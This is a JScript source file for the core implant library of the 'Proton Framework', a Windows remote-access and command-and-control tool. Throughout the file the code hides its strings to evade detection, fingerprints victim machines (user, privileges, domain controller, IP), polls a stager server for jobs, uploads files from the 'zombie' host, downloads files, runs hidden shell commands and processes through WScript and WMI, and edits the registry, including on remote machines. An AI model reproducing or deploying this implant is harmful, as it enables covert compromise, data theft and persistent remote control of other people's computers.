//            ---------------------------------------------------
//                             Proton Framework              
//            ---------------------------------------------------
//                Copyright (C) <2019-2020>  <Entynetproject>
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

var proton = {};

proton.FS = new ActiveXObject("Scripting.FileSystemObject");
proton.WS = new ActiveXObject("WScrip"+"t.Shell");
proton.STAGER = "~URL~";
proton.SESSIONKEY = "~SESSIONKEY~";
proton.JOBKEY = "~JOBKEY~";
proton.JOBKEYPATH = "~URL~?~SESSIONNAME~=~SESSIONKEY~;~JOBNAME~=";
proton.EXPIRE = "~_EXPIREEPOCH_~";

/**
 * Sleeps the current thread
 *
 * @param int ms - how long to sleep in milliseconds
 * @param function callback - where to continue execution after the sleep
 *
 * @return void
 */
 //sleep.start
proton.sleep = function(#ms#, #callback#)
{
    if (proton.isHTA())
    {
        window.setTimeout(#callback#, #ms#);
    }
    else
    {
        var #now# = new Date().getTime();
        while (new Date().getTime() < #now# + #ms#);
        #callback#();
    }
}
//sleep.end

/**
 * Attempts to kill the current process using a myriad of methods
 *
 * @return void
 */
//exit.start
proton.exit = function()
{
    if (proton.isHTA())
    {
        // crappy hack?
        try {
          window.close();
        } catch(e){}

        try {
          window.self.close();
        } catch (e){}

        try {
          window.top.close();
        } catch (e){}


        try{
            self.close();
        } catch (e){}

        try
        {
            window.open('', '_se'+'l'+'f', '');
            window.close();
        }
        catch (e)
        {
        }
    }

    try
    {
        WScript.quit();
    }
    catch (e)
    {
    }

    try
    {
        var #pid# = proton.process.currentPID();
        proton.process.kill(#pid#);
    }
    catch (e)
    {
    }
}
//exit.end

/**
 * Determine if running in HTML Application context
 *
 * @return bool - true if HTML application context
 */
//isHTA.start
proton.isHTA = function()
{
    return typeof(window) !== "undef"+"ined";
}
//isHTA.end

/**
 * Determine if running in WScript Application context
 *
 * @return bool - true if WScript context
 */
 //isWScript.start
proton.isWScript = function()
{
    return typeof(WScript) !== "un"+"defined";
}
//isWScript.end
//uuid.start
proton.uuid = function()
{
    try
    {
        function #s4#()
        {
            return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
        }
        return #s4#() + #s4#() + '-' + #s4#() + '-' + #s4#() + '-' +
            #s4#() + '-' + #s4#() + #s4#() + #s4#();
    }
    catch(e)
    {
    }
}
//uuid.end

proton.user = {};

//user.isElevated.start
proton.user.isElevated = function()
{
    try
    {
        var #res# = proton.shell.exec("whoa"+"mi /"+"all", "%TE"+"MP%\\"+proton.uuid()+".txt");
        if (#res#.indexOf("SeDebugPrivilege") == -1)
            return false;
        else
            return true;
    }
    catch(e)
    {
        return false;
    }
}
//user.isElevated.end
//user.OS.start
proton.user.OS = function()
{
    try
    {
        // var wmi = GetObject("winmgmts:\\\\.\\root\\CIMV2");
        // var colItems = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem");
        // var enumItems = new Enumerator(colItems);
        // var objItem = enumItems.item();
        var #osver# = proton.WS.RegRead("HK"+"LM\\SOFTWARE\\Micr"+"osoft\\Windows NT\\CurrentVers"+"ion\\ProductName");
        var #osbuild# = proton.WS.RegRead("H"+"KLM\\SOFTWARE\\Micros"+"oft\\Windo"+"ws NT\\CurrentVersion\\Curren"+"tBuildNumber");
        return #osver#+"***"+#osbuild#;
    }
    catch(e){}

    return "Unkno"+"wn";
}
//user.OS.end
//user.DC.start
proton.user.DC = function()
{
    try
    {
        var #DC# = proton.WS.RegRead("HKLM\\SOFT"+"WARE\\Microsoft\\Win"+"dows\\CurrentVersion\\Group "+"Policy\\History\\DC"+"Name");
        if (#DC#.length > 0)
        {
            //DC += "___" + proton.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\MachineDomain")
            //DC += proton.user.ParseDomainAdmins(proton.shell.exec("net group \"Domain Admins\" /domain", "%TEMP%\\das.txt"));
            return #DC#;
        }
    }
    catch(e)
    {
    }
    return "Un"+"known";

}
//user.DC.end

/*proton.user.ParseDomainAdmins = function(results)
{
    try
    {
        var domain = results.split("domain controller for domain ")[1].split(".\r\n")[0];
        var retstring = "___" + domain;
        var parse1 = results.split("-------\r\n")[1].split("The command completed successfully.")[0];
        var parse2 = parse1.split("\r\n");
        var tmp = [];
        for(var i = 0; i < parse2.length; i++)
        {
            tmp = parse2[i].split(" ");
            for(var j = 0; j < tmp.length; j++)
            {
                if(tmp[j])
                {
                    retstring += "___" + tmp[j].toLowerCase();
                }
            }
        }
    }
    catch(e)
    {
    }
    return retstring;
}*/
//user.Arch.start
proton.user.Arch = function()
{
    try
    {
        // var wmi = GetObject("winmgmts:\\\\.\\root\\CIMV2");
        // var colItems = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem");

        // var enumItems = new Enumerator(colItems);
        // var objItem = enumItems.item();
        var #arch# = proton.WS.RegRead("HK"+"LM\\SY"+"STEM\\CurrentControlSet\\Contr"+"ol\\Sessi"+"on Manager\\Environment\\PROCESSO"+"R_ARCHITECTURE");
        return #arch#;
    }
    catch(e){}

    return "Unk"+"nown";
}
//user.Arch.end
//user.CWD.start
proton.user.CWD = function()
{
    try
    {
        var #cwd# = proton.shell.exec("c"+"d", "%TE"+"MP%\\"+proton.uuid()+".txt");
        return #cwd#;
    }
    catch(e)
    {}

    return "";
}
//user.CWD.end
//user.IPAddrs.start
/*
proton.user.IPAddrs = function()
{
    var interfaces = proton.shell.exec("reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\interfaces", "%TEMP%\\"+proton.uuid()+".txt");
    var interfacearray = interfaces.split("\n");
    var retstring = "";
    var interfaceid = "";
    for (var i=0;i<interfacearray.length-1;i++)
    {
        interfaceid = interfacearray[i].split("\\")[interfacearray[i].split("\\").length-1];
        try
        {
            var interface = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\interfaces\\"+interfaceid;
            var res = proton.shell.exec("reg query "+interface+" /v DhcpIPAddress", "%TEMP%\\"+proton.uuid()+".txt");
            retstring += res.split("REG_SZ")[1].split("\r\n")[0]+"___";
            res = proton.shell.exec("reg query "+interface+" /v IPAddress", "%TEMP%\\"+proton.uuid()+".txt");
            retstring += res.split("REG_MULTI_SZ")[1].split("\r\n")[0]+"___";
        }
        catch(e)
        {continue;}
    }
    return retstring;
}
*/

proton.user.IPAddrs = function()
{
    // try
    // {
    //     var ipconfig = proton.shell.exec("ipconfig", "%TEMP%\\"+proton.uuid()+".txt");
    //     var ip = ipconfig.split("  IPv4 ")[1].split(": ")[1].split("\r\n")[0];
    //     return ip;
    // }
    // catch(e)
    // {
    //     try
    //     {
    //         var ip = ipconfig.split("  IP ")[1].split(": ")[1].split("\r\n")[0];
    //         return ip;
    //     }
    //     // we might need to add more conditions :/
    //     catch(e)
    //     {}
    // }

    try
    {
        var #routeprint4# = proton.shell.exec("route PRINT", "%TEMP%\\"+proton.uuid()+".txt");
        var #res# = #routeprint4#.split("\r\n");
        for (var i=0; i < #res#.length; i++)
        {
            #line# = #res#[i].split(" ");
            // count how many 0.0.0.0 entries in this array
            #zerocount# = 4-4;
            // count how many entries in this array aren't empty
            #itemcount# = 9-9;
            // flag for when this is the line we're looking for
            #correctflag# = false;
            for (var j=0; j < #line#.length; j++)
            {
                // empty string evals to false
                if (#line#[j])
                {
                    #itemcount# += 6-5;
                    // ip addr is in the 4th column
                    if (#itemcount# == 2+2 && #correctflag#) {
                        return #line#[j];
                    }
                }
                if (#line#[j] == "0."+"0.0.0")
                {
                    #zerocount# += 9-8;
                    // 2 occurances of the 'any' interface in a single line is what we're looking for
                    if (#zerocount# == 1+1)
                    {
                        #correctflag# = true;
                    }
                }
            }
        }
    }
    catch(e)
    {}

    return "";
}
//user.IPAddrs.end
//user.info.start
proton.user.info = function()
{
    var #net# = new ActiveXObject("WSc"+"ript.Net"+"work");
    var #domain# = "";
    if (#net#.UserDomain.length != 0)
    {
        #domain# = #net#.UserDomain;
    }
    else
    {
        #domain# = proton.shell.exec("echo %us"+"erdomain%", "%TE"+"MP%\\"+proton.uuid()+".txt");
        #domain# = #domain#.split(" \r\n")[0];
    }
    var #info# = #domain# + "\\" + #net#.Username;

    if (proton.user.isElevated())
        #info# += "*";

    var #bypassio# = #net#.ComputerName;

    #info# += "~"+"~~" + #bypassio#;
    #info# += "~~"+"~" + proton.user.OS();
    #info# += "~"+"~~" + proton.user.DC();
    #info# += "~~"+"~" + proton.user.Arch();
    #info# += "~"+"~~" + proton.user.CWD();
    #info# += "~~"+"~" + proton.user.IPAddrs();
    #info# += "~"+"~~" + proton.user.encoder();
    #info# += "~~"+"~" + proton.user.shellchcp();

    return #info#;
}
//user.info.end
//user.encoder.start
proton.user.encoder = function()
{
    try
    {
        var encoder = proton.WS.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\ACP");
        return encoder;
    }
    catch(e)
    {
        return "1252";
    }
}
//user.encoder.end
//user.shellchcp.start
proton.user.shellchcp = function()
{
    try
    {
        var encoder = proton.WS.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\OEMCP");
        return encoder;
    }
    catch(e)
    {
        return "437";
    }
}
//user.shellchcp.end

proton.work = {};

/*
proton.work.applyDefaultHeaders = function(headers)
{
    var headers = (typeof(headers) !== "undefined") ? headers : {};
    headers["SESSIONKEY"] = proton.SESSIONKEY;
    headers["JOBKEY"] = proton.JOBKEY;
}
*/

/**
 * Reports a successful message to the stager
 *
 * @param string data - The post body
 * @param map headers - Any additional HTTP headers
 *
 * @return object - the HTTP object
 */
//work.report.start
proton.work.report = function(data, headers)
{
    //var headers = proton.work.applyDefaultHeaders(headers);
    return proton.http.post(proton.work.make_url(), data, headers);
}
//work.report.end

/**
 * Reports an error condition to the stager
 *
 * @param exception e - what exception was thrown
 *
 * @return object - the HTTP object
*/
//work.error.start
proton.work.error = function(e)
{
    try
    {
        var headers = {};
        headers["errno"] = (e.number) ? e.number : "-1";
        headers["errname"] = (e.name) ? e.name : "Unknown";
        headers["errdesc"] = (e.description) ? e.description : "Unknown";
        return proton.work.report(e.message, headers);
    }
    catch (e)
    {
        // Abandon all hope ye who enter here
        // For this is where all things are left behind
    }
}
//work.error.end

/**
 * Makes the stager callhome URL for a specific jobkey
 *
 * @param string jobkey - which job to fetch
 *
 * @return string - the stager callhome URL
*/
//work.make_url.start
proton.work.make_url = function(jobkey)
{
    var jobkey = (typeof(jobkey) !== "undefined") ? jobkey : proton.JOBKEY;
    return proton.JOBKEYPATH + jobkey + ";";
}
//work.make_url.end
/**
 * Fetches the next job from the server
 *
 * @return object - the HTTP object
*/
//work.get.start
proton.work.get = function()
{
    var url = proton.work.make_url();
    return proton.http.post(url);
}
//work.get.end

/**
 * Forks a new process and runs the specific jobkey
 *
 * @param string jobkey - the job to fetch/run
 * @param bool fork32Bit - ensure new process is x86
 *
 * @return void
*/
//work.fork.start
proton.work.fork = function(jobkey, fork32Bit)
{
    var fork32Bit = (typeof(fork32Bit) !== "undefined") ? fork32Bit : false;

    var cmd = "~_FORKCMD_~";

    if (fork32Bit)
        cmd = proton.file.get32BitFolder() + cmd;

    cmd = cmd.replace("***K***", proton.work.make_url(jobkey));
    try {
    //   proton.WMI.createProcess(cmd);
    // } catch (e) {
        proton.WS.Run(cmd, 0, false);
    } catch (e) {
        try {
            proton.WMI.createProcess(cmd);
        } catch (e) {
            proton.exit();
        }
    }
}
//work.fork.end
proton.http = {};

//http.create.start
proton.http.create = function()
{
    var http = null;

    try
    {
        http = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");
        http.setTimeouts(0, 0, 0, 0);

        //http = new ActiveXObject("Microsoft.XMLHTTP");
    }
    catch (e)
    {
        http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        http.setTimeouts(30000, 30000, 30000, 0);
    }

    return http;
}
//http.create.end
//http.addHeaders.start
proton.http.addHeaders = function(http, headers)
{
    var headers = (typeof(headers) !== "undefined") ? headers : {};

    var content = false;
    for (var key in headers)
    {
        var value = headers[key];

        http.setRequestHeader(key, value);
        if (key.toUpperCase() == "CONTENT-TYPE")
            content = true;
    }

    if (!content)
    {
        http.setRequestHeader("Content-Type", "application/octet-stream");
    }

    http.setRequestHeader("encoder", proton.user.encoder());
    http.setRequestHeader("shellchcp", proton.user.shellchcp());
    return;
}
//http.addHeaders.end

//http.post.start
proton.http.post = function(url, data, headers)
{
    var data = (typeof(data) !== "undefined") ? data : "";
    //var http = new ActiveXObject("Microsoft.XMLHTTP");
    var http = proton.http.create();

    http.open("POST", url, false);
    proton.http.addHeaders(http, headers);
    // alert("---Making request---\n" + url + '\n' + "--Data--\n" + data);
    http.send(data);
    // alert("---Response---\n" + http.responseText)
    return http;
}
//http.post.end

//http.get.start
proton.http.get = function(url, headers)
{
    var http = proton.http.create();
    http.open("GET", url, false);
    proton.http.addHeaders(http, headers);
    http.send();
    return http;
}
//http.get.end

/**
 * Upload a file, off zombie, to stager
 *
 * @param filepath - the full path to the file to send
 * @param header_uuid - a unique identifier for this file
 * @param header_key - optional HTTP header tag to send uuid over
 *
 * @return object - the HTTP object
 *
**/
//http.upload.start
proton.http.upload = function(filepath, header_uuid, certutil, header_key)
{
    var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";
    var headers = {};
    headers[key] = header_uuid;

    var data = proton.file.readBinary(filepath, true, certutil);

    if (proton.user.encoder() == "936")
    {
        // do nothing
    }
    else
    {
        // we must replace null bytes or MS will cut off the body
        data = data.replace(/\\/g, "\\\\");
        data = data.replace(/\0/g, "\\0");
    }

    return proton.work.report(data, headers);
}
//http.upload.end
//http.download.start
proton.http.download = function(filepath, header_uuid, header_key)
{
    var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";

    var headers = {};
    headers[key] = header_uuid;

    return proton.http.downloadEx("POST", proton.work.make_url(), headers, filepath);
}
//http.download.end
//http.downloadEx.start
proton.http.downloadEx = function(verb, url, headers, path)
{
    if (verb == "GET")
    {
        var http = proton.http.get(url, headers);
    }
    else
    {
        var http = proton.http.post(url, "", headers);
    }

    var stream = new ActiveXObject("Adodb.Stream");
    stream.Type = 1;
    stream.Open();
    stream.Write(http.responseBody);


    var data = proton.http.bin2str(stream);
    proton.file.write(path, data);
}
//http.downloadEx.end
//http.bin2str.start
proton.http.bin2str = function(stream)
{
    stream.Flush();
    stream.Position = 0;

    var bin = stream.Read();
    var rs = new ActiveXObject("Adodb.RecordSet");
    rs.Fields.Append("temp", 101+100, stream.Size);

    rs.Open();
    rs.AddNew();
    rs("temp").AppendChunk(bin);
    rs.Update();
    var data = rs.GetString();
    rs.Close();
    return data.substring(0, data.length - 1);
}
//http.bin2str.end
proton.process = {};

//process.currentPID.start
proton.process.currentPID = function()
{
    var cmd = proton.file.getPath("%comspec% /K hostname");
    //proton.WS.Run(cmd, 0, false);
    var childPid = proton.WMI.createProcess(cmd);

    var pid = -1;
    // there could be a race condition, but CommandLine returns null on win2k
    // and is often null on later windows with more harsh privileges

    // todo: this method is stupid. instead of using .Run, spawn a WMI process.
    // then we get child PID for free and can backtrack PPID, no race condition
    var latestTime = 0;
    var latestProc = null;

    var processes = proton.process.list();

    var items = new Enumerator(processes);
    while (!items.atEnd())
    {
        var proc = items.item();

        try
        {
            /*
            if (proc.Name.indexOf("cmd") != -1)
            {
                if (latestTime == 0 && proc.CreationDate)
                    latestTime = proc.CreationDate;

                if (proc.CreationDate > latestTime)
                {
                    latestTime = proc.CreationDate;
                    latestProc = proc;
                }
            }
            */
            if (proc.ProcessId == childPid)
            {
                latestProc = proc;
                break;
            }
        } catch (e)
        {
        }
        items.moveNext();
    }

    pid = latestProc.ParentProcessId;
    latestProc.Terminate();

    return pid;
}
//process.currentPID.end

//process.kill.start
proton.process.kill = function(pid)
{
    var processes = proton.process.list();

    var items = new Enumerator(processes);
    while (!items.atEnd())
    {
        var proc = items.item();

        try
        {
            if (proc.ProcessId == pid)
            {
                proc.Terminate();
                return true;
            }
        } catch (e)
        {
        }
        items.moveNext();
    }

    return false;
}
//process.kill.end

//process.list.start
proton.process.list = function()
{
    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
    var query = "Select * Fr"+"om Win32_Process";

    return wmi.ExecQuery(query);
}
//process.list.end

//process.getPID.start
proton.process.getPID = function(process_name)
{
    var processes = proton.process.list();

    var items = new Enumerator(processes);
    while (!items.atEnd())
    {
        var proc = items.item();

        try
        {
            if (proc.Name == process_name)
            {
                return proc.ProcessId;
            }
        } catch (e)
        {
        }
        items.moveNext();
    }

    return false;
}
//process.getPID.end

// http://apidock.com/ruby/Win32/Registry/Constants
//registry.start
proton.registry = {};
proton.registry.HKCR = 0x80000000;
proton.registry.HKCU = 0x80000001;
proton.registry.HKLM = 0x80000002;

proton.registry.STRING = 0;
proton.registry.BINARY = 1;
proton.registry.DWORD = 2;
proton.registry.QWORD = 3;

//registry.provider.start
proton.registry.provider = function(computer)
{
    var computer = (typeof(computer) !== "undefined") ? computer : ".";
    var reg = GetObject("winmgmts:\\\\" + computer + "\\root\\default:StdRegProv");
    return reg;
}
//registry.provider.end

//registry.write.start
proton.registry.write = function(hKey, path, key, value, valType, computer)
{
    var reg = proton.registry.provider(computer);

    reg.CreateKey(hKey, path);

    if (valType == proton.registry.STRING)
        reg.SetStringValue(hKey, path, key, value);
    else if (valType == proton.registry.DWORD)
        reg.SetDWORDValue(hKey, path, key, value);
    else if (valType == proton.registry.QWORD)
        reg.SetQWORDValue(hKey, path, key, value);
    else if (valType == proton.registry.BINARY)
        reg.SetBinaryValue(hKey, path, key, value);
}
//registry.write.end
//registry.read.start
proton.registry.read = function(hKey, path, key, valType, computer)
{
    var reg = proton.registry.provider(computer);

    var methodName = "";
    if (valType == proton.registry.STRING)
        methodName = "GetStringValue";
    else if (valType == proton.registry.DWORD)
        methodName = "GetDWORDValue";
    else if (valType == proton.registry.QWORD)
        methodName = "GetQWORDValue";
    else if (valType == proton.registry.BINARY)
        methodName = "GetBinaryValue";

    if (methodName == "")
        return;

    var method = reg.Methods_.Item(methodName);
    var inparams = method.InParameters.SpawnInstance_();

    inparams.hDefKey = hKey;
    inparams.sSubKeyName = path;
    inparams.sValueName = key;

    var outparams = reg.ExecMethod_(method.Name, inparams);

    return outparams;
}
//registry.read.end
//registry.destroy.start
proton.registry.destroy = function(hKey, path, key, computer)
{
    var reg = proton.registry.provider(computer);
    var loc = (key == "") ? path : path + "\\" + key;
    return reg.DeleteKey(hKey, loc);
}
//registry.destroy.end
/*
// DEPRECATED
proton.registry.create = function(hiveKey, path, key, computer)
{
    var computer = (typeof(computer) !== "undefined") ? computer : ".";
    var sw = new ActiveXObject("WbemScripting.SWbemLocator");
    var root = sw.ConnectServer(computer, "root\\default");
    var reg = root.get("StdRegProv");

    var enumKey = reg.Methods_.Item("EnumKey");

    var inParams = enumKey.InParameters.SpawnInstance_();
    inParams.hDefKey = hiveKey;
    inParams.sSubKeyName = path;

    var outParam = reg.ExecMethod_(enumKey.Name, inParams);

    if (outParam.ReturnValue != 0)
        return false;

    if (outParam.sNames)
    {
        var subKeys = outParam.sNames.toArray();

        for (var i = 0; i < subKeys.length; ++i)
        {
            if (subkeys[i].toUpperCase() == key.toUpperCase())
                return true;
        }
    }

    var createKey = reg.Methods_.Item("CreateKey");
    var createArgs = createKey.InParameters.SpawnInstance_();
    createArgs.hDefKey = hiveKey;
    createArgs.sSubKeyName = path + "\\" + key;

    var createRet = reg.ExecMethod_(createKey.Name, createArgs);
    return createRet.returnValue == 0;
}
*/
//registry.end

proton.WMI = {};

//WMI.createProcess.start
proton.WMI.createProcess = function(cmd, #dpriv#)
{

    var SW_HIDE = 0;
    var pid = 0;

    var #dpriv# = (typeof(#dpriv#) !== "undefined") ? #dpriv# : false;

    var #part1# = "winmgmts:{impersonationLevel=impersonate";
    if (#dpriv#)
    {
        #part1# += ", (DEBUG)";
    }
    var #part2# = "}!\\\\.\\root\\cimv2";

    var wmi = GetObject(#part1#+#part2#);

    var si = wmi.Get("Win"+"32_ProcessStartup").SpawnInstance_();
    si.ShowWindow = SW_HIDE;
    si.CreateFlags = 16777216;
    si.X = si.Y = si.XSize = si.ySize = 1;

    //wmi.Get("Win32_Process").Create(cmd, null, si, pid);
    var w32proc = wmi.Get("Win32_Process");

    var method = w32proc.Methods_.Item("Create");
    var inParams = method.InParameters.SpawnInstance_();
    inParams.CommandLine = cmd;
    inParams.CurrentDirectory = null;
    inParams.ProcessStartupInformation = si;

    var outParams = w32proc.ExecMethod_("Create", inParams);
    return outParams.ProcessId;
}
//WMI.createProcess.end

proton.shell = {};
//shell.exec.start
proton.shell.exec = function(cmd, stdOutPath)
{
    cmd = "chcp " + proton.user.shellchcp() + " & " + cmd;
    var c = "%comspec% /q /c " + cmd + " 1> " + proton.file.getPath(stdOutPath);
    c += " 2>&1";
    proton.WS.Run(c, 0, true);
    if (proton.user.encoder() == "936")
    {
        var data = proton.file.readText(stdOutPath);
    }
    else
    {
        var data = proton.file.readBinary(stdOutPath);
    }
    proton.file.deleteFile(stdOutPath);

    return data;
}
//shell.exec.end
//shell.run.start
proton.shell.run = function(cmd, fork)
{
    var fork = (typeof(fork) !== "undefined") ? fork : true;
    var c = "%comspec% /q /c " + cmd;
    proton.WS.Run(cmd, 5-5, !fork);
}
//shell.run.end

proton.file = {};

//file.getPath.start
proton.file.getPath = function(path)
{
    return proton.WS.ExpandEnvironmentStrings(path);
}
//file.getPath.end

/**
* @return string - the system folder with x86 binaries
*/
//file.get32BitFolder.start
proton.file.get32BitFolder = function()
{
    var base = proton.file.getPath("%WINDIR%");
    var syswow64 = base + "\\SysWOW64\\";

    if (proton.FS.FolderExists(syswow64))
        return syswow64;

    return base + "\\System32\\";
}
//file.get32BitFolder.end
//file.readText.start
proton.file.readText = function(path)
{
    var loopcount = 0;
    while(true)
    {
        if (proton.FS.FileExists(proton.file.getPath(path)) && proton.FS.GetFile(proton.file.getPath(path)).Size > 0)
        {
            try
            {
                var fd = proton.FS.OpenTextFile(proton.file.getPath(path), 1, false, 0);
                var data = fd.ReadAll();
                fd.Close();
                return data;
            }
            catch (e)
            {
                // if the file is too big, certutil won't be able to write everything in time
                // and we run into a permissions error on read. we just need it to finish writing
                // before we can read it.
                proton.shell.run("ping 127."+"0.0.1 -n 2", false);
                continue;
            }
        }
        else
        {
            loopcount += 1;
            if (loopcount > 180)
            {
                return "";
            }
            proton.shell.run("ping 127."+"0.0.1 -n 2", false);
        }
    }
}
//file.readText.end
//file.readBinary.start
proton.file.readBinary = function(path, exists, certutil)
{
    var exists = (typeof(exists) !== "undefined") ? exists : false;
    var certutil = (typeof(certutil) !== "undefined") ? certutil : false;

    if (!proton.FS.FileExists(proton.file.getPath(path)) && exists)
    {
        var headers = {};
        headers["Status"] = "NotExist";
        proton.work.report("", headers);
        return "";
    }

    var loopcount = 0;
    while(true)
    {

        if (proton.FS.FileExists(proton.file.getPath(path)) && proton.FS.GetFile(proton.file.getPath(path)).Size > 0)
        {
            if (proton.user.encoder() == "936" || certutil)
            {
                var newout = "%TEMP%\\"+proton.uuid()+".t"+"xt";
                proton.shell.run("certut"+"il -encode "+proton.file.getPath(path)+" "+newout);
                var data = proton.file.readText(newout);
                proton.file.deleteFile(newout);
            }
            else
            {
                var fp = proton.FS.GetFile(proton.file.getPath(path));
                var fd = fp.OpenAsTextStream();
                var data = fd.read(fp.Size);
                fd.close();
            }
            return data;
        }
        else
        {
            loopcount += 1;
            if (loopcount > 180)
            {
                return "";
            }
            proton.shell.run("ping 127."+"0.0.1 -n 2", false);
        }
    }
}

//file.readBinary.end
//file.write.start
proton.file.write = function(path, data)
{
    var fd = proton.FS.CreateTextFile(proton.file.getPath(path), true);
    fd.write(data);
    fd.close();
}
//file.write.end
//file.deleteFile.start
proton.file.deleteFile = function(path)
{
    proton.FS.DeleteFile(proton.file.getPath(path), true);
};
//file.deleteFile.end
